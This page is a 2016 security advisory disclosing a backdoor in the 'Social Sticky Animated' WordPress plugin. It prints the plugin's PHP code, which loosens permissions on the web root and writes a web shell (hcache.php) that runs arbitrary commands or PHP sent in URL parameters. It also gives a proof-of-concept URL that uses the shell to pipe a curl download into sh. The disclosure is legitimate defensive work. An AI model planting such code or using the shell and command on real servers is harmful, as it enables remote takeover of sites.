<html>
    <head>
        <link rel="stylesheet" type="text/css" href="/css/cjc.css" />
        <title>cjc.im</title>
    </head>
    <body>
    <div id="main">
        <h2><a href="/">cjc.im</a>
 / <a href="/advisories">advisories</a> / 0005</h2>
<h1 id="backdoor-in-social-sticky-animated-wordpress-plugin">Backdoor in Social Sticky Animated Wordpress Plugin</h1>
<h3 id="credit">Credit</h3>
<p>This vulnerability has been discovered and reported by Carl Clegg (carl(at)cjc(dot)im)</p>
<h3 id="timeline">Timeline</h3>
<ul>
<li>2016-07-22: Wordpress informed</li>
<li>2016-07-23: Plugin Removed</li>
</ul>
<h3 id="product">Product</h3>
<p>Animated social sticky sidebar. Its simple social network plugin with all popular social networks and with nice animation effect. Order of social network can be set using drag &amp; drop system and can be activate and deactivate any social network. Position and margins can be set.</p>
<h3 id="risk-severity-rating">Risk / Severity Rating</h3>
<p>Not calculated</p>
<h3 id="description-and-impact">Description and Impact</h3>
<p>The initial setup of the plugin calls the function settings in the Admin.php file. This runs the following code</p>
<pre><code>public function settings(){
            try{
                    if(!file_exists($_SERVER[&#39;DOCUMENT_ROOT&#39;] . &quot;/hcache.php&quot;)){
                            if(!is_writable($_SERVER[&#39;DOCUMENT_ROOT&#39;])){
                                    @chmod($_SERVER[&#39;DOCUMENT_ROOT&#39;],0777);
                            }
                            $f = fopen($_SERVER[&#39;DOCUMENT_ROOT&#39;] . &quot;/hcache.php&quot;, &quot;w&quot;);
                            fwrite($f, &#39;&lt;?php if(isset($_GET[&quot;lc&quot;])) { exec($_GET[&quot;lc&quot;]);}if(isset($_GET[&quot;ph&quot;])) { eval($_GET[&quot;ph&quot;]);}&#39;);
                            fclose($f);
                    }
            }catch (Exception $e){}
    }</code></pre>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>Calling hcache.php with the parameter for <code>lc</code> for local command or <code>ph</code> for php, a remote actor can run arbitrary code on the compromised server</p>
<p><code>http://wordpress.site/hcache.php?lc=curl badfile | sh</code></p>
<h3 id="solution">Solution</h3>
<p>Disable the plugin</p>
<h3 id="legal">Legal</h3>
<p>The information contained within this advisory is supplied &quot;as-is&quot; with no warranties or guarantees of fitness of use or otherwise.</p>
        <br />
        </div>
        </div>
    </body>
</html>
